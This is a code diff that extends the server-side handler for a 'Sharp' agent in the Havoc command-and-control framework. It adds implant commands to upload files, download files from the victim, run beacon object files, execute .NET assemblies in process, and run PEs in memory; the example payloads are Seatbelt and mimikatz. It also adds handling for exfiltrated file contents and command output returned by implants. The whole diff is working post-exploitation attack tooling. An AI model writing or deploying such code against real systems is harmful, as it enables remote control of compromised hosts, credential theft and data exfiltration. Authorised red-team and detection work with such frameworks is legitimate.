@@ -4,7 +4,6 @@ from havoc.agent import *
 import os, re
 
 class CommandShell(Command):
-    #CommandId = 18
     Name = "shell"
     Description = "Executes commands using cmd.exe"
     Help = "Example: shell whoami /all"
@@ -41,7 +40,6 @@ class CommandShell(Command):
         '''
 
 class CommandExit(Command):
-    #CommandId   = COMMAND_EXIT
     Name        = "exit"
     Description = "Tells the agent to exit"
     Help        = "Just exit lmao"
@@ -98,12 +96,128 @@ class CommandLs(Command):
         print("[*] job generate")
         packer = Packer()
 
+        packer.add_data("ls "+arguments["path"])
+        return packer.buffer
+class CommandUpload(Command):
+    Name        = "upload"
+    Description = "Upload a file. Need to specify full path to destination."
+    Help = "Example: upload /etc/passwd \\Windows\\Temp\\bruh"
+    NeedAdmin = False
+    Mitr = []
+    Params = [
+        CommandParam(
+            name="local_file",
+            is_file_path=True,
+            is_optional=False
+        ),
+        CommandParam(
+            name="remote_path",
+            is_file_path=False,
+            is_optional=False
+        )
+    ]
+
+    def job_generate(self, arguments: dict) -> bytes:
+        print("[*] job generate")
+        packer = Packer()
+        packer.add_data("upload remote_dest="+arguments["remote_path"]+";"+arguments["local_file"])
+        return packer.buffer
+class CommandDownload(Command):
+    Name        = "download"
+    Description = "Download a file. Need to specify full path to destination."
+    Help = "Example: Download \\Windows\\Temp\\bruh"
+    NeedAdmin = False
+    Mitr = []
+    Params = [
+        CommandParam(
+            name="remote_path",
+            is_file_path=False,
+            is_optional=False
+        )
+    ]
+
+    def job_generate(self, arguments: dict) -> bytes:
+        print("[*] job generate")
+        packer = Packer()
         #AesKey = base64.b64decode(arguments["__meta_AesKey"])
         #AesIV = base64.b64decode(arguments["__meta_AesIV"])
+        packer.add_data("download remote_dest="+arguments["remote_path"])
+        return packer.buffer
+class CommandBofExec(Command):
+    Name        = "bofexec"
+    Description = "Run a bof. Need to specify full path to destination. No command line arg support for now."
+    Help = "Example: bofexec Bofs/SAObjectFiles/whoami.x64.o"
+    NeedAdmin = False
+    Mitr = []
+    Params = [
+        CommandParam(
+            name="local_bof",
+            is_file_path=True,
+            is_optional=False
+        ),
+    ]
 
-        #commands = "/C " + arguments["commands"]
-        #packer.add_data(commands)
-        packer.add_data("ls "+arguments["path"])
+    def job_generate(self, arguments: dict) -> bytes:
+        print("[*] job generate")
+        packer = Packer()
+
+        #AesKey = base64.b64decode(arguments["__meta_AesKey"])
+        #AesIV = base64.b64decode(arguments["__meta_AesIV"])
+        packer.add_data("bofexec "+ arguments["local_bof"])
+        return packer.buffer
+class CommandInlineAssembly(Command):
+    Name        = "inline_assembly"
+    Description = "Run a .NET assembly in process. Need to specify full path to destination. No command line arg support for now."
+    Help = "Example: inline_assembly Assemblies/seatbelt.exe"
+    NeedAdmin = False
+    Mitr = []
+    Params = [
+        CommandParam(
+            name="local_assembly",
+            is_file_path=True,
+            is_optional=False
+        ),
+        CommandParam(
+            name="args",
+            is_file_path=False,
+            is_optional=True
+        )
+    ]
+
+    def job_generate(self, arguments: dict) -> bytes:
+        print("[*] job generate")
+        packer = Packer()
+
+        #AesKey = base64.b64decode(arguments["__meta_AesKey"])
+        #AesIV = base64.b64decode(arguments["__meta_AesIV"])
+        packer.add_data("inline_assembly file="+ arguments["local_assembly"]+";"+arguments["args"])
+        return packer.buffer
+class CommandInlinePE(Command):
+    Name        = "inline_pe"
+    Description = "Run a x64 PE in memory. Need to specify full path to destination."
+    Help = "Example: inline_pe PEs/mimikatz.exe"
+    NeedAdmin = False
+    Mitr = []
+    Params = [
+        CommandParam(
+            name="local_exe",
+            is_file_path=True,
+            is_optional=False
+        ),
+        CommandParam(
+            name="args",
+            is_file_path=False,
+            is_optional=True
+        )
+    ]
+
+    def job_generate(self, arguments: dict) -> bytes:
+        print("[*] job generate")
+        packer = Packer()
+
+        #AesKey = base64.b64decode(arguments["__meta_AesKey"])
+        #AesIV = base64.b64decode(arguments["__meta_AesIV"])
+        packer.add_data("inline_pe file="+ arguments["local_exe"]+";"+arguments["args"])
         return packer.buffer
 class Sharp(AgentType):
     Name = "Sharp"
@@ -157,6 +271,11 @@ class Sharp(AgentType):
         CommandExit(),
         CommandSleep(),
         CommandLs(),
+        CommandUpload(),
+        CommandDownload(),
+        CommandBofExec(),
+        CommandInlineAssembly(),
+        CommandInlinePE(),
     ]
 
     def generate( self, config: dict ) -> None:
@@ -219,7 +338,7 @@ class Sharp(AgentType):
             self.builder_send_payload( config[ 'ClientID' ], self.Name + ".exe", data )
         
         except:
-            self.builder_send_message( config[ 'ClientID' ], "Info", "There was a build error, returning an empty blob so handler doesn't bork" )
+            self.builder_send_message( config[ 'ClientID' ], "Error", "There was a build error, returning an empty blob so handler doesn't bork" )
             self.builder_send_payload( config[ 'ClientID' ], "THIS SHIT ERRORED", b'bruh' )
     
     def command_not_found(self, response: dict) -> dict:
@@ -242,15 +361,11 @@ class Sharp(AgentType):
     
     def response( self, response: dict ) -> bytes:
         agent_header    = response[ "AgentHeader" ]
-
-        print("Receieved request from agent")
         agent_header    = response[ "AgentHeader" ]
         agent_response  = base64.b64decode( response[ "Response" ] ) # the teamserver base64 encodes the request.
-        #print(agent_response)
-        agentjson = json.loads(agent_response)
-        #print(agent_header)
+
+        agentjson = json.loads(agent_response, strict=False)
         if agentjson["task"] == "register":
-            #print(json.dumps(agentjson,indent=4))
             print("[*] Registered agent")
             self.register( agent_header, json.loads(agentjson["data"]) )
             AgentID = response[ "AgentHeader" ]["AgentID"]
@@ -258,16 +373,20 @@ class Sharp(AgentType):
             return b'registered'
         elif agentjson["task"] == "gettask":
             AgentID = response[ "Agent" ][ "NameID" ]
-            #self.console_message( AgentID, "Good", "Host checkin", "" )
-
-            #print("[*] Agent requested taskings")
             Tasks = self.get_task_queue( response[ "Agent" ] )
-            #print("Tasks retrieved")
+            return Tasks
+        elif agentjson["task"] == "commandoutput":
+            AgentID = response[ "Agent" ][ "NameID" ]
             if len(agentjson["data"]) > 0:
-                print("Output: " + agentjson["data"])
                 self.console_message( AgentID, "Good", "Received Output:", agentjson["data"] )
-            #print(Tasks)
-        return Tasks
+        elif agentjson["task"] == "download":
+            AgentID = response[ "Agent" ][ "NameID" ]
+            downloadJson = json.loads(agentjson["data"])
+            fileName = downloadJson["FileName"]
+            fileSize = downloadJson["FileSize"]
+            fileContent = base64.b64decode(downloadJson["FileContent"]).decode("utf-8") 
+            self.download_file( AgentID, fileName, fileSize, fileContent)
+        return b''
 
 
 def main():
